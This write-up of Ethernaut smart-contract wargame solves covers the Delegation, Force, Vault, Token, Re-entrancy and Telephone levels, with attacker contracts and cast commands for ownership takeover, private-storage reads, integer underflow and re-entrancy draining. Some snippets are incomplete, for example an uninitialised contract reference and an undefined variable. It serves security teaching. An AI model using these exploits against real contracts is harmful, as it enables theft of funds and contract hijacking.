# Case studies (deep) — the canonical solves worked through

## Ethernaut "Delegation" — the full solve

```solidity
// Delegate.sol
contract Delegate {
    address public owner;
    function pwn() public { owner = msg.sender; }
}
// Delegation.sol
contract Delegation {
    address public owner; Delegate delegate;
    fallback() external { delegate.delegatecall(msg.data); }
}
```

The solve: call `Delegation`'s `fallback` with `pwn()`'s selector —
`delegatecall` runs `Delegate.pwn` on DELEGATION's storage; `msg.sender`
preserved = the caller → the caller becomes `Delegation.owner`.

```bash
cast send $DELEGATION "pwn()" --private-key $KEY --rpc-url $RPC   # the fallback delegates it
cast call $DELEGATION "owner()(address)" --rpc-url $RPC            # = the caller
```

The mechanism: `delegatecall` preserves `msg.sender` on the caller's storage —
`owner = msg.sender` = the original caller.

## Ethernaut "Force" — the full solve

`Force` has no `receive`/`fallback`; `isSolved` is `balance > 0`.

```solidity
contract Attack {
    constructor() payable {}                 // funded on deploy
    function boom() external { selfdestruct(payable(FORCE)); }
}
```

```bash
cast send --create "<Attack-bin>" --value 0.001ether --private-key $KEY --rpc-url $RPC
cast send $ATTACK "boom()" --private-key $KEY --rpc-url $RPC
cast balance $FORCE --rpc-url $RPC   # > 0
```

## Ethernaut "Vault" — the private read

`Vault.unlock(bytes32)` checks `_password == password` (`private`).

```bash
cast storage $VAULT 1 --rpc-url $RPC   # slot 1 = the password
cast send $VAULT "unlock(bytes32)" 0x<pw> --private-key $KEY --rpc-url $RPC
cast call $VAULT "locked()(bool)" --rpc-url $RPC   # false
```

## Ethernaut "Token" — the underflow

`Token` `pragma ^0.5`: `transfer` does `balances[msg.sender] - value` with no
SafeMath → `0 - 1` wraps to `2**256-1`.

```bash
cast send $TOKEN "transfer(address,uint256)" $X 1 --private-key $KEY --rpc-url $RPC
cast call $TOKEN "balanceOf(address)(uint256)" $ME --rpc-url $RPC   # huge
```

## Ethernaut "Re-entrancy" — the drain

`Reentrance.withdraw` does `call{value}` then `balances -=`.

```solidity
contract Attack {
    Reentrance r;
    function attack() payable { r.donate{value:msg.value}(address(this)); r.withdraw(msg.value); }
    receive() payable { if (address(r).balance > 0) r.withdraw(1 ether); }
}
```

The `receive` re-enters `withdraw` before `balances` settles — drains the
contract.

## Ethernaut "Telephone" — tx.origin

`Telephone.changeOwner` requires `tx.origin != msg.sender`:

```solidity
contract Phish { function attack(address t) { Telephone(t).changeOwner(caller); } }
```

`caller` = the supplied EOA (passed in); `tx.origin` = the EOA, `msg.sender` =
Phish → the check passes → owner = the caller.

## The pattern each locks in

Every one reduces to "a reachable transition flips the predicate" — the
mechanism varies, the shape doesn't.
